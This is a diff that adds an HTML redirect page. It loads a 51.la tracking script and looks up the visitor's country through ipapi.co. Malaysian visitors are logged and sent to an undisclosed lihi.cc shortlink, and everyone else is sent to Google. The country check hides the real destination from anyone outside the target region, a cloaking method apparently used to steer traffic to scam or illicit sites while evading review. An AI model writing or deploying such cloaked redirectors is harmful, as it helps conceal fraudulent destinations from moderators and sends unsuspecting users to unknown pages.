@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+ 
+  
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // 使用ipapi.co的免费API检测国家代码
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                // 判断国家代码是否为马来西亚（MY）
+                if (data.country_code === 'MY') {
+                  LA.init({id:"KjdmTikwyxTs9zJG",ck:"KjdmTikwyxTs9zJG"});
+                    window.location.href = 'https://lihi.cc/8sxZT';
+                } else {
+                    window.location.href = 'https://www.google.com';
+                }
+            })
+            .catch(error => {
+                console.error('Error detecting location:', error);
+                // 如果检测失败默认跳转
+               // window.location.href = 'https://www.123.com';
+            });
+    </script>
+</head>
+<body>
+ 
+</body>
+</html>
